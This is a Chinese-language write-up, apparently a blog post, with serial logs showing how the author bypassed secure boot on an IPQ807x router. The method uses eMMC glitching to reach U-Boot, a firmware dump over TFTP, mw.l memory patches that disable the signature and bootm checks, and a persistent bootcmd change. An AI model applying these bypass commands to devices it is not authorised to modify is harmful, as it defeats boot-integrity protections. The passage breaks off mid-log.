[\u0026lt;ffffffc000082a18\u0026gt;] do_one_initcall+0x19c/0x1b8\r[ 2.335635] [\u0026lt;ffffffc000822b20\u0026gt;] kernel_init_freeable+0x18c/0x22c\r[ 2.341536] [\u0026lt;ffffffc0005ca13c\u0026gt;] kernel_init+0x10/0xec\r[ 2.347523] [\u0026lt;ffffffc000085d50\u0026gt;] ret_from_fork+0x10/0x40\r[ 2.352605] coresight-stm: probe of 6002000.stm failed with error -1\r[ 2.359327] of_graph_get_next_endpoint(): no port node found in /soc/hwevent@6101000\r[ 2.364494] coresight-hwevent 6101000.hwevent: Hardware Event driver initialized\r[ 2.375574] NET: Registered protocol family 10\r[ 2.380206] MAP-T DMR module registered. enter [ 2.383716] Registering family.\r[ 2.388199] NET: Registered protocol family 17\r[ 2.391311] bridge: automatic filtering via arp/ip/ip6tables has been deprecated. Update your scripts to load br_netfilter if you need this.\r[ 2.395844] Bridge firewalling registered\r[ 2.408564] 8021q: 802.1Q VLAN Support v1.8\r[ 2.413826] qcom,cpr4-apss-regulator b018000.cpr4-ctrl: CPR valid fuse count: 4\r[ 2.416679] pmd9655_s3: supplied by e-smps1-reg\r[ 2.423886] cpr4_ipq807x_apss_read_fuse_data: apc_corner: speed bin = 0\r[ 2.428277] cpr4_ipq807x_apss_read_fuse_data: apc_corner: CPR fusing revision = 1\r[ 2.434877] cpr4_ipq807x_apss_read_fuse_data: apc_corner: CPR misc fuse value = 0\r[ 2.442516] cpr4_ipq807x_apss_read_fuse_data: apc_corner: Voltage boost fuse config = 0 boost = disable\r[ 2.450047] cpr3_mem_acc_init: apc: not using memory accelerator regulator\r[ 2.459181] cpr4_ipq807x_apss_calculate_open_loop_voltages: apc_corner: fused SVS: open-loop= 704000 uV\r[ 2.466126] cpr4_ipq807x_apss_calculate_open_loop_voltages: apc_corner: fused NOM: open-loop= 832000 uV\r[ 2.476107] cpr4_ipq807x_apss_calculate_open_loop_voltages: apc_corner: fused TURBO: open-loop= 888000 uV\r[ 2.485916] cpr4_ipq807x_apss_calculate_open_loop_voltages: apc_corner: fused STURBO: open-loop= 976000 uV\r[ 2.495782] cpr4_ipq807x_apss_calculate_target_quotients: apc_corner: fused SVS: quot[ 7]= 701, quot_offset[ 7]= 0\r[ 2.505540] cpr4_ipq807x_apss_calculate_target_quotients: apc_corner: fused NOM: quot[ 7]= 941, quot_offset[ 7]= 240\r[ 2.516388] cpr4_ipq807x_apss_calculate_target_quotients: apc_corner: fused TURBO: quot[ 7]=1032, quot_offset[ 7]= 90\r[ 2.527324] cpr4_ipq807x_apss_calculate_target_quotients: apc_corner: fused STURBO: quot[ 7]=1187, quot_offset[ 7]= 155\r[ 2.538388] cpr3_regulator_init_ctrl: apc: Default CPR mode = closed-loop\r[ 2.549741] qcom,cpr3-npu-regulator a4000.npu-cpr: NPU CPR valid fuse count: 2\r[ 2.556039] pmd9655_s4: supplied by e-smps1-reg\r[ 2.563179] cpr3_mem_acc_init: npu: not using memory accelerator regulator\r[ 2.567511] npu_corner: fused NOM: open-loop= 792000 uV\r[ 2.574448] npu_corner: fused TURBO: open-loop= 872000 uV\r[ 2.580288] npu_corner: fused NOM: open-loop= 792000 uV\r[ 2.585906] npu_corner: fused TURBO: open-loop= 872000 uV\r[ 2.591556] npu_corner: Normal and Cold condition init done. Default to normal.\r[ 2.598125] cpufreq: cpufreq_online: CPU0: Running at unlisted freq: 800000 KHz\r[ 2.604397] cpufreq: cpufreq_online: CPU0: Unlisted initial frequency changed to: 1017600 KHz\r[ 2.612018] mmc:emmc actual mid 0x15 and syscon select node DsLow,syscon\r[ 2.620209] mmc:syscon reg base 0xa000 regval 0x9e5b\r[ 2.626968] qcom_ice_get_pdevice: found ice device ffffffc07bfcd200\r[ 2.631896] qcom_ice_get_pdevice: matching platform device ffffffc07bc3d000\r[ 2.637930] sdhci_msm 7824900.sdhci: No vreg data found for vdd\r[ 2.644844] sdhci_msm 7824900.sdhci: No vreg data found for vdd-io\r[ 2.650894] qcom_ice 7803000.sdcc1ice: QC ICE 2.1.44 device found @0xffffff8000f3c000\r[ 2.658053] sdhci_msm 7824900.sdhci: No vmmc regulator found\r[ 2.664891] sdhci_msm 7824900.sdhci: No vqmmc regulator found\r[ 2.714371] mmc0: SDHCI controller on 7824900.sdhci [7824900.sdhci] using ADMA 64-bit\r[ 2.720336] qcom-q6v5-wcss-pil cd00000.qcom_q6v5_wcss: ssr registeration success qcom_q6v5_wcss\r[ 2.721213] remoteproc remoteproc0: cd00000.qcom_q6v5_wcss is available\r[ 2.731960] hctosys: unable to open rtc device (rtc0)\r[ 2.740923] pmd9655_ldo11: disabling\r[ 2.741899] ALSA device list:\r[ 2.745150] No soundcards found.\r[ 2.748245] Waiting for root device PARTUUID=3f6c8b45-381d-2e4d-a72c-4a59900be353...\r[ 2.787084] mmc0: MAN_BKOPS_EN bit is not set\r[ 2.828060] mmc0: new HS200 MMC card at address 0001\r[ 2.828379] mmcblk0: mmc0:0001 8GTF4R 7.28 GiB [ 2.832194] mmcblk0rpmb: mmc0:0001 8GTF4R partition 3 512 KiB\r[ 2.837318] Alternate GPT is invalid, using primary GPT.\r[ 2.842255] GPT: device [179:20] (rootfs) set to be root filesystem\r[ 2.847646] mmcblk0: p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 p17 p18 p19 p20 p21 p22 p23 p24 p25 p26 p27 p28 p29 p30 p31 p32 p33 p34 p35 p36 p37 p38\r[ 2.966125] VFS: Mounted root (squashfs filesystem) readonly on device 179:20.\r[ 2.966226] Freeing unused kernel memory: 228K (ffffffc000822000 - ffffffc00085b000)\r[ 2.972246] Freeing alternatives memory: 44K (ffffffc00085b000 - ffffffc000866000)\rfailed to open /proc/modules\r[ 3.143863] init: Console is alive\r[ 3.143959] init: - watchdog -\r[ 3.710640] Button Hotplug driver version 0.4.1\r[ 3.711666] device-mapper: req-crypt: dm-req-crypt successfully initalized.\r[ 3.711666] [ 3.716474] SCSI subsystem initialized\r[ 4.146523] init: - preinit -\r[ 4.150006] led_smooth init\r[ 4.150112] Before mount_root\r[ 4.454442] /dev/mmcblk0p24: recovering journal\r/dev/mmcblk0p24: clean, 202/32768 files, 10897/131072 blocks\r/dev/mmcblk0p24: clean, 202/32768 files, 10897/131072 blocks\r/dev/mmcblk0p25: clean, 11/32768 files, 6257/131072 blocks\r/dev/mmcblk0p25: clean, 11/32768 files, 6257/131072 blocks\r 我草，开了secure boot，这还刷个毛啊\n绕过安全启动 编程器在公司，不想等到周一上班再拆flash用编程器读了，所以目前没固件可以直接分析。\n获取U-Boot Shell执行权限 串口直接打断，要输入用户名和密码。图忘了存，长这样\nHit space key to stop autoboot: %2d\r%2d Username#\rroot\rPassword#\rYou have %d times left to enter correct password.\rYou have %d times left to enter correct username.\r 要是有固件dump可以逆向一下，问题是没有。。。\n所以想办法让bootcmd报错，它可能会fallback到tftpboot或者什么恢复模式\n这个设备只有一个emmc存储器，只要在Hit space key to stop autoboot之后，短接emmc时钟或者供电，就会让bootcmd找不到东西读了。\n那么短接哪里呢？量了一下emmc附近，找到了emmc的1.8V供电，短接。不行，串口那边看到设备直接重启了。说明这货的CPU 1.8V和emmc 1.8V是连到一起的。\n也可以试试短接clk，但是不好找。\nemmc一般有个内部电压，在设计的时候要求那里对外挂个电容。把那个对地短接就会让emmc内部逻辑死掉，我猜是这个\n这个是emmc背面的图。蓝色框标识emmc的位置，红圈这个电容感觉比较可疑。我们这么做\n 不要短接，直接插电开机，等U-Boot跑到Hit space key to stop autoboot:  这个时候短接，就没法启动了，因为U-Boot在emmc里面呢   这个时候有3秒倒数，用镊子夹住上面那张图的红圈里面的电容，让emmc挂掉 等串口提示报错的时候，松开镊子。然后就可以进入U-Boot shell了  U-Boot 1.3.3 [spf11.1_csu2] (Apr 22 2021 - 18:02:25 +0800)\rDRAM: smem ram ptable found: ver: 1 len: 4\r2 GiB\r[Askey] Led init ...\rNAND: Could not find nand_gpio in dts, using defaults\rNot an ONFI device\rONFI probe failed\rID = ffffffff\rVendor = ff\rDevice = ff\rqpic_nand: unknown NAND device manufacturer: ff device: ff\rU-Boot BUG at drivers/mtd/mtdcore.c:420!\rSF: Unsupported flash IDs: manuf ff, jedec ffff, ext_jedec ffff\ripq_spi: SPI Flash not found (bus/cs/speed/mode) = (0/0/48000000/0)\r0 MiB\rMMC: \u0026lt;NULL\u0026gt;: 0 (eMMC)\rIn: serial@78B3000\rOut: serial@78B3000\rErr: serial@78B3000\rmachid: 8750106\reth5 MAC Address from ART is not valid\rHit space key to stop autoboot: 0 [Askey] do_bootaskey()\rcheck temperature of soc 36 ,and threshold 80\r[Askey] thermal_check_temp pass\rmmc:mmcargs=mmc_mid=15\r[Askey] do_boot_signedimg_askey()\r*** ERROR: Can't read GPT header ***\rget_partition_info_efi: *** ERROR: Invalid GPT ***\r*** ERROR: Can't read GPT header ***\rget_partition_info_efi: *** ERROR: Invalid Backup GPT ***\rbootipq: unsupported partition name rootfs\rNet: *** ERROR: Can't read GPT header ***\rget_partition_info_efi: *** ERROR: Invalid GPT ***\r*** ERROR: Can't read GPT header ***\rget_partition_info_efi: *** ERROR: Invalid Backup GPT ***\rART partition read failed..\rMAC0 addr:0:3:7f:ba:db:ad\rPHY ID1: 0x4d\rPHY ID2: 0xd0b1\rPHY ID1: 0x4d\rPHY ID2: 0xd101\rEDMA ver 1 hw init\rNum rings - TxDesc:1 (0-0) TxCmpl:1 (7-7)\rRxDesc:1 (15-15) RxFill:1 (7-7)\ripq807x_edma_alloc_rings: successfull\ripq807x_edma_setup_ring_resources: successfull\ripq807x_edma_configure_rings: successfull\ripq807x_edma_hw_init: successfull\reth0\rWarning: eth0 MAC addresses don't match:\rAddress in SROM is 00:03:7f:ba:db:ad\rAddress in environment is fc:12:63:09:65:01\rIPQ807x#\r 回读固件 先看一下分区\nIPQ807x# mmc part\rPartition Map for MMC device 0 -- Partition Type: EFI\rPart\tStart LBA\tEnd LBA\tName\rAttributes\rType GUID\rPartition GUID\r1\t0x00000022\t0x00000821\t\u0026quot;0:SBL1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tdea0ba2c-cbdd-4805-b4f9-f428251c3e98\rguid:\tb11f979c-a6a1-7dad-766a-52ec9d1f69a2\r2\t0x00000822\t0x00000c21\t\u0026quot;0:BOOTCONFIG\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t2b7d04ff-31f0-4e6a-be9a-da50314dad58\rguid:\te1cc547d-3706-17f9-7b07-efaa332e3a54\r3\t0x00000c22\t0x00001021\t\u0026quot;0:BOOTCONFIG1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t7bd25378-5c39-11e5-8a77-40a8f05f1418\rguid:\td064f02d-802e-f97c-2196-7d9a28862e19\r4\t0x00001022\t0x00002821\t\u0026quot;0:QSEE\u0026quot;\rattrs:\t0x0000000000000000\rtype:\ta053aa7f-40b8-4b1c-ba08-2f68ac71a4f4\rguid:\te024699e-a604-64c3-af91-dd7f2d3d8d9c\r5\t0x00002822\t0x00004021\t\u0026quot;0:QSEE_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\ta6dd74a1-c8bf-4dbc-ae39-62b8e78c4038\rguid:\ta32ee7af-b10b-5926-b6d5-a415ef787b67\r6\t0x00004022\t0x00004421\t\u0026quot;0:DEVCFG\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tf65d4b16-343d-4e25-aafc-be99b6556a6d\rguid:\tf2068355-7423-87b6-6ffb-6c0db243402e\r7\t0x00004422\t0x00004821\t\u0026quot;0:DEVCFG_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t48bfa451-9443-46f7-b400-892a6b1bfc16\rguid:\taad4ffbc-ba9f-8756-4cf6-e47818b36a23\r8\t0x00004822\t0x00004c21\t\u0026quot;0:APDP\u0026quot;\rattrs:\t0x0000000000000000\rtype:\te6e98da2-e22a-4d12-ab33-169e7deaa507\rguid:\t9a09c33a-d949-b53f-2b81-bb728f607f45\r9\t0x00004c22\t0x00005021\t\u0026quot;0:APDP_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tbdabad63-8404-4ed1-b20b-132247ab7232\rguid:\t8d596925-14cd-d5fa-cb3f-0d46f67e8502\r10\t0x00005022\t0x00005421\t\u0026quot;0:RPM\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t098df793-d712-413d-9d4e-89d711772228\rguid:\t057659e1-6366-df5d-4fd6-ef67f745b428\r11\t0x00005422\t0x00005821\t\u0026quot;0:RPM_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t2d2be762-890b-11e5-aaf3-40a8f05f1418\rguid:\t7ec0012c-752a-8898-d38e-9dde8864465d\r12\t0x00005822\t0x00005c21\t\u0026quot;0:CDT\u0026quot;\rattrs:\t0x0000000000000000\rtype:\ta19f205f-ccd8-4b6d-8f1e-2d9bc24cffb1\rguid:\ta9968e42-3bc2-0d62-0dc0-6d6c953edc27\r13\t0x00005c22\t0x00006021\t\u0026quot;0:CDT_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t7a795379-c250-4282-a2c7-fc4e13f4a43d\rguid:\t06727772-3e7d-60c3-416f-59d60246529a\r14\t0x00006022\t0x00006221\t\u0026quot;0:APPSBLENV\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t300ffdcd-22e0-47e7-9a23-f16ed9382387\rguid:\tca5fe99e-3630-cc58-f03a-4c223b60377f\r15\t0x00006222\t0x00007221\t\u0026quot;0:APPSBL\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t400ffdcd-22e0-47e7-9a23-f16ed9382388\rguid:\t8323e484-0b7e-b74e-e344-95a264b7f669\r16\t0x00007222\t0x00008221\t\u0026quot;0:APPSBL_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tc126787d-3eef-444c-9e43-feff3f103e22\rguid:\te147448f-28eb-4877-468a-46841023239f\r17\t0x00008222\t0x00008a21\t\u0026quot;0:ART\u0026quot;\rattrs:\t0x0000000000000000\rtype:\ta72e50c1-d37c-429d-9620-35fca612b9a8\rguid:\t209d5e03-9f46-58f1-f475-a1682fd502a7\r18\t0x00008a22\t0x0000ca21\t\u0026quot;0:HLOS\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tb51f2982-3ebe-46de-8721-ee641e1f9997\rguid:\tfc9f02d9-646f-4b01-00d1-4d696a2b7c0a\r19\t0x0000ca22\t0x00010a21\t\u0026quot;0:HLOS_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\ta71da577-7f81-4626-b4a2-e377f9174525\rguid:\t926aaabd-bf15-b4b6-1082-1541fc02c402\r20\t0x00010a22\t0x00050a21\t\u0026quot;rootfs\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t98d2248d-7140-449f-a954-39d67bd6c3b4\rguid:\t3f6c8b45-381d-2e4d-a72c-4a59900be353\r21\t0x00050a22\t0x00054a21\t\u0026quot;0:WIFIFW\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t888d8069-8d27-40a8-95a9-6006e1ce9b3b\rguid:\t76635aec-3b11-8f3e-ccdb-fa07684ea781\r22\t0x00054a22\t0x00094a21\t\u0026quot;rootfs_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t5647b280-dc2a-485d-9913-cf53ac40fa32\rguid:\tfca50a80-6d83-9a4a-665a-07ece7f995bf\r23\t0x00094a22\t0x00098a21\t\u0026quot;0:WIFIFW_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t981476f5-5cd7-42db-9ce9-87b3a31aadbd\rguid:\tb2288cbf-7e91-3317-78bf-8bd7d5ca32a1\r24\t0x00098a22\t0x00198a21\t\u0026quot;rootfs_data\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tab1760da-a8bb-4d6f-98d2-9ad3ab9009cd\rguid:\t069840ca-3ca3-d716-3143-e3e7249caa52\r25\t0x00198a22\t0x00298a21\t\u0026quot;rootfs_data_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t1119cee3-a4f1-43d0-90d1-2d226e401189\rguid:\tbe7ad292-7f2e-3a7f-8569-48a1460346a4\r26\t0x00298a22\t0x00298e21\t\u0026quot;0:ETHPHYFW\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tc1dc4cab-430b-4cdc-a8c5-7115912b74fe\rguid:\t82a73814-ce17-9078-74aa-5df43ec665e2\r27\t0x00298e22\t0x0029ce21\t\u0026quot;econfig\u0026quot;\rattrs:\t0x0000000000000000\rtype:\te0aaf192-cad4-4128-9f05-d2831ca67b58\rguid:\t8ee63329-427f-740f-0822-bf92fcf20365\r28\t0x0029ce22\t0x002a4e21\t\u0026quot;edata\u0026quot;\rattrs:\t0x0000000000000000\rtype:\ta917ab5a-6c83-48af-95db-1004bc925c52\rguid:\t2861eaca-97f3-89ef-1966-94df053ce852\r29\t0x002a4e22\t0x002e4e21\t\u0026quot;log\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t2dd625ce-bc7a-4b6a-933a-57bc0d338e9c\rguid:\t41b339d2-35c1-f85b-06a8-f98dd5694207\r30\t0x002e4e22\t0x002ece21\t\u0026quot;persist\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t2f4bbc39-e2dd-4882-87c9-8a402ace35b2\rguid:\t3f470a3a-2170-4dac-ee79-1df7c7e49e4a\r31\t0x002ece22\t0x004ece21\t\u0026quot;usr_app\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tbd65288f-d717-4c23-8f2b-ead6a8a229eb\rguid:\tcbaa1cc8-b7ec-5125-f2cb-c1ec8d7e481c\r32\t0x004ece22\t0x004eee21\t\u0026quot;rsvd_1\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t2cba182a-d45e-4f7d-8b40-c8e206aa227a\rguid:\t379a0b90-8ce7-20ba-7ad2-1ac28d9f2ac1\r33\t0x004eee22\t0x004f0e21\t\u0026quot;rsvd_2\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t1094c6ff-3a45-4ba1-acc5-f94717881e0f\rguid:\t02772c71-7bdc-1333-2f64-f3afa49c5478\r34\t0x004f0e22\t0x004f1e21\t\u0026quot;rsvd_3\u0026quot;\rattrs:\t0x0000000000000000\rtype:\tf6b84fe9-4030-44f6-8842-42cf6d6ab37a\rguid:\t4d8fc9fe-7b22-af55-a893-0434e538abe7\r35\t0x004f1e22\t0x004f9e21\t\u0026quot;rsvd_4\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t8ecb9dd2-5907-4d9e-87af-7edc799ac7be\rguid:\t50bb92fa-e6d3-3e3e-344c-c90126d3e6b6\r36\t0x004f9e22\t0x00509e21\t\u0026quot;rsvd_5\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t5eb110b9-88ef-461f-8867-e601a9e12ac7\rguid:\tff00255a-1899-2e4f-ca5d-043026fa3e15\r37\t0x00509e22\t0x00529e25\t\u0026quot;rsvd_6\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t27e70c71-5403-4cd7-8b7d-d53cbaf9bd89\rguid:\t13c4dfe2-cd9f-08fd-99a4-bb882dfa8915\r38\t0x00529e26\t0x00e7ffe1\t\u0026quot;user_data\u0026quot;\rattrs:\t0x0000000000000000\rtype:\t173f1230-bab4-4505-8c1c-665e95867ea2\rguid:\t97e1c59d-739c-dd4c-9635-4f34003d0d5b\r 发现这个uboot功能还挺全，有tftpput。尝试用这个把固件读回来，我是这么做的\n 先插网线，dhcp，可以拿到IP 把flash读到内存里  高通这个一般内核加载地址在0x44000000，uboot在0x4a000000，所以从0x50000000读比较安全，内存一共2G，我们读个1G多点，到persist分区那里就行 mmc read 0x50000000 0 0x002ece22 这个0x002ece22是persist分区末尾扇区来的   用tftpput把分区发回来  tftpput 0x50000000 10.114.51.4:sax1v1k_emmc.img 这个0x5d9c4400是persist分区末尾扇区0x002ece22*512来的    就可以拿到固件辣\n逆向固件 U-Boot密码 在这里，findcrypt一下，发现是个sha256，哈希是1154C605385F2B69CF1E42B9692C124A7A35F2D6719394246A3A3F73A5D52B56，解不出来\n放弃\n安全启动验证 逆了一下bootipq，没搞定，太恶心了，而且它这个HLOS也不是标准的FIT Image，前面加了0x28字节的怪东西\n问了@暗云 说可以直接mmc read然后bootm，试试\nIPQ807x# bootm\rNot allowed command, use bootipq.resetting ...\r 那就要逆向一下看看哪里限制的，然后在U-Boot里patch掉就行\n转换成uboot命令：mw.l 0x4a910f80 e3a00001\n然后读HLOS，开机：mmc read 0x44000000 0x8a22 0x4000; bootm 0x44000000#config@rt5010w-d187-rev6;，炸了\n肯定起不来，因为目前HLOS里是厂家魔改的数据结构，开头多了0x28\n刷固件进去 按照一般套路，刷固件进去是先tftpboot下载到内存，再mmc write写进emmc\n但是tftpboot被干了，发现它在检查证书\nIPQ807x# tftpboot 192.168.4.3:sax1v1k_kernel\rsecure boot fuse is enabled\r*** ERROR: Can't read GPT header ***\rget_partition_info_efi: *** ERROR: Invalid GPT ***\r*** ERROR: Can't read GPT header ***\rget_partition_info_efi: *** ERROR: Invalid Backup GPT ***\r** Invalid partition 34 **\rdebug cert - not found\rresetting ...\rFormat: Log Type - Time(microsec) - Message - Optional Info\rLog Type: B - Since Boot(Power On Reset), D - Delta, S - Statistic\rS - QC_IMAGE_VERSION_STRING=BOOT.BF.3.3.1-00163\rS - IMAGE_VARIANT_STRING=HAASANAZA\rS - OEM_IMAGE_VERSION_STRING=CRM\rS - Boot Config, 0x000002e3\rB - 203 - PBL, Start\rB - 2739 - bootable_media_detect_entry, Start\rB - 88791 - bootable_media_detect_success, Start\r 也可能是emmc读报错导致的，先重新扫描下emmc\nIPQ807x# mmc rescan\rIPQ807x# tftpboot 192.168.4.3:sax1v1k_kernel\rsecure boot fuse is enabled\rdebug cert - not found\rresetting ...\rFormat: Log Type - Time(microsec) - Message - Optional Info\rLog Type: B - Since Boot(Power On Reset), D - Delta, S - Statistic\rS - QC_IMAGE_VERSION_STRING=BOOT.BF.3.3.1-00163\rS - IMAGE_VARIANT_STRING=HAASANAZA\rS - OEM_IMAGE_VERSION_STRING=CRM\rS - Boot Config, 0x000002e3\rB - 203 - PBL, Start\r 一样的问题，没这个debug cert\n那就一样的方法，Patch掉校验逻辑，让sub_4A90596C这个函数直接返回0就行\n之后就可以把kernel和rootfs刷进去了\nIPQ807x# mw.l 4A90597C e3a00000\rIPQ807x# mw.l 4A905980 ea000138\rIPQ807x# tftpboot 0x44000000 192.168.4.3:sax1v1k_kernel\rsecure boot fuse is enabled\ripq807x_eth_halt: done\reth0 PHY0 Down Speed :10 Half duplex\reth0 PHY1 up Speed :1000 Full duplex\reth0 PHY2 Down Speed :10 Half duplex\reth0 PHY3 Down Speed :10 Half duplex\reth0 PHY4 Down Speed :10 Half duplex\reth0 PHY5 Down Speed :10 Half duplex\ripq807x_eth_init: done\rUsing eth0 device\rTFTP from server 192.168.4.3; our IP address is 192.168.4.236\rFilename 'sax1v1k_kernel'.\rLoad address: 0x44000000\rLoading: *\rGot TFTP_OACK: TFTP remote port: changes from 69 to 63845\r#################################################################\r#################################################################\r#################################################################\r#################################################################\r#########################################################\r4.7 MiB/s\rdone\rBytes transferred = 4647816 (46eb88 hex)\ripq807x_eth_halt: done\rIPQ807x# flash 0:HLOS\r*** ERROR: Can't read GPT header ***\rget_partition_info_efi: *** ERROR: Invalid GPT ***\r*** ERROR: Can't read GPT header ***\rget_partition_info_efi: *** ERROR: Invalid Backup GPT ***\rIPQ807x# mmc rescan\rIPQ807x# flash 0:HLOS\rMMC erase: dev # 0, block # 35362, count 16384 ... 16384 blocks erased: OK\rMMC write: dev # 0, block # 35362, count 9078 ... 9078 blocks written: OK\rIPQ807x# tftpboot 0x44000000 192.168.4.3:sax1v1k_root\rsecure boot fuse is enabled\ripq807x_eth_halt: done\reth0 PHY0 Down Speed :10 Half duplex\reth0 PHY1 up Speed :1000 Full duplex\reth0 PHY2 Down Speed :10 Half duplex\reth0 PHY3 Down Speed :10 Half duplex\reth0 PHY4 Down Speed :10 Half duplex\reth0 PHY5 Down Speed :10 Half duplex\ripq807x_eth_init: done\rUsing eth0 device\rTFTP from server 192.168.4.3; our IP address is 192.168.4.236\rFilename 'sax1v1k_root'.\rLoad address: 0x44000000\rLoading: *\rGot TFTP_OACK: TFTP remote port: changes from 69 to 61202\r#################################################################\r#################################################################\r#################################################################\r#################################################################\r#################################################################\r#################################################################\r#################################################################\r#################################################################\r#################################################################\r############################################\r4.7 MiB/s\rdone\rBytes transferred = 9229312 (8cd400 hex)\ripq807x_eth_halt: done\rIPQ807x# flash rootfs\rMMC erase: dev # 0, block # 68130, count 262144 ... 262144 blocks erased: OK\rMMC write: dev # 0, block # 68130, count 18026 ... 18026 blocks written: OK\r 持久化 我们肯定不想每次开机都短接一次，虽然可以塞个MCU进去这么干，但是太麻烦了，能不能持久化呢？\n显然是可以的，因为高通这个安全启动是个假的安全启动，并不验证U-Boot ENV的签名。所以我们把bootcmd改掉就行\nmmc rescan\rsetenv bootcmd \u0026quot;mw.l 0x4a910f80 e3a00001; mmc read 0x44000000 0x8a22 0x4000; bootm 0x44000000#config@rt5010w-d187-rev6;\u0026quot;\rsaveenv\r  干掉uboot里面对bootm的限制 加载内核 开跑  之后就能自动开机了，固件用的是https://github.com/MeisterLone/Askey-RT5010W-D187-REV6/blob/master/OpenWrt-r22241/openwrt-ipq807x-generic-askey_rt5010w-d187-squashfs-sysupgrade.bin\n固件没有NSS加速，没有闭源wifi驱动，没有160M频宽，只拿来测试一下能开机就行\n还是得看我们Chinese QSDK: https://github.com/coolsnowwolf/lede （大雕打钱）\n修改后的启动log，开机直接进系统\nFormat: Log Type - Time(microsec) - Message - Optional Info\rLog Type: B - Since Boot(Power On Reset), D - Delta, S - Statistic\rS - QC_IMAGE_VERSION_STRING=BOOT.BF.3.3.1-00163\rS - IMAGE_VARIANT_STRING=HAASANAZA\rS - OEM_IMAGE_VERSION_STRING=CRM\rS - Boot Config, 0x000002e3\rB - 203 - PBL, Start\rB - 2740 - bootable_media_detect_entry, Start\rB - 83485 - bootable_media_detect_success, Start\rB - 83489 - elf_loader_entry, Start\rB - 84913 - auth_hash_seg_entry, Start\rB - 123001 - auth_hash_seg_exit, Start\rB - 137593 - elf_segs_hash_verify_entry, Start\rB - 200226 - PBL, End\rB - 324977 - SBL1, Start\rB - 404704 - GCC [RstStat:0x10, RstDbg:0x600000] WDog Stat : 0x4\rB - 414617 - pm_device_init, Start\rB - 606218 - PM_SET_VAL:Skip\rD - 189649 - pm_device_init, Delta\rB - 608658 - pm_driver_init, Start\rD - 5215 - pm_driver_init, Delta\rB - 614758 - clock_init, Start\rD - 2135 - clock_init, Delta\rB - 618936 - boot_flash_init, Start\rD - 7869 - boot_flash_init, Delta\rB - 630587 - boot_config_data_table_init, Start\rD - 1067 - boot_config_data_table_init, Delta - (575 Bytes)\rB - 638212 - Boot Setting : 0x00000618\rB - 642055 - CDT version:2,Platform ID:8,Major ID:117,Minor ID:1,Subtype:6\rB - 649070 - sbl1_ddr_set_params, Start\rB - 652883 - CPR configuration: 0x30c\rB - 656329 - cpr_init, Start\rB - 659105 - Rail:0 Mode: 5 Voltage: 808000\rB - 664320 - CL CPR settled at 760000mV\rB - 667157 - Rail:1 Mode: 5 Voltage: 880000\rB - 671335 - Rail:1 Mode: 7 Voltage: 920000\rD - 16531 - cpr_init, Delta\rB - 678137 - Pre_DDR_clock_init, Start\rB - 682224 - Pre_DDR_clock_init, End\rB - 685548 - DDR Type : PCDDR4\rB - 692380 - do ddr sanity test, Start\rD - 1037 - do ddr sanity test, Delta\rB - 696071 - DDR: Start of HAL DDR Boot Training\rB - 700737 - DDR: End of HAL DDR Boot Training\rB - 706502 - DDR: Checksum to be stored on flash is -1525685476\rB - 716902 - Image Load, Start\rD - 344833 - QSEE Image Loaded, Delta - (1380440 Bytes)\rB - 1061827 - Image Load, Start\rD - 427 - SEC Image Loaded, Delta - (0 Bytes)\rB - 1069360 - Image Load, Start\rD - 287859 - DEVCFG Image Loaded, Delta - (32468 Bytes)\rB - 1357311 - Image Load, Start\rD - 292800 - RPM Image Loaded, Delta - (93060 Bytes)\rB - 1650202 - Image Load, Start\rD - 312808 - APPSBL Image Loaded, Delta - (617384 Bytes)\rB - 1963132 - QSEE Execution, Start\rD - 61 - QSEE Execution, Delta\rB - 1968927 - USB D+ check, Start\rD - 0 - USB D+ check, Delta\rB - 1975332 - SBL1, End\rD - 1652643 - SBL1, Delta\rS - Flash Throughput, 34388 KB/s (2124599 Bytes, 61782 us)\rS - DDR Frequency, 600 MHz\rS - Core 0 Frequency, 1651 MHz\rU-Boot 1.3.3 [spf11.1_csu2] (Apr 22 2021 - 18:02:25 +0800)\rDRAM: smem ram ptable found: ver: 1 len: 4\r2 GiB\r[Askey] Led init ...\rNAND: Could not find nand_gpio in dts, using defaults\rNot an ONFI device\rONFI probe failed\rID = ffffffff\rVendor = ff\rDevice = ff\rqpic_nand: unknown NAND device manufacturer: ff device: ff\rU-Boot BUG at drivers/mtd/mtdcore.c:420!\rSF: Unsupported flash IDs: manuf ff, jedec ffff, ext_jedec ffff\ripq_spi: SPI Flash not found (bus/cs/speed/mode) = (0/0/48000000/0)\r0 MiB\rMMC: \u0026lt;NULL\u0026gt;: 0 (eMMC)\rIn: serial@78B3000\rOut: serial@78B3000\rErr: serial@78B3000\rmachid: 8750106\reth5 MAC Address from ART is not valid\rHit space key to stop autoboot: 0 MMC read: dev # 0, block # 35362, count 16384 ... 16384 blocks read: OK\r## Loading kernel from FIT Image at 44000000 ...\rUsing 'config@rt5010w-d187-rev6' configuration\rTrying 'kernel-1' kernel subimage\rDescription: ARM64 OpenWrt Linux-5.15.98\rType: Kernel Image\rCompression: gzip compressed\rData Start: 0x440000e8\rData Size: 4604026 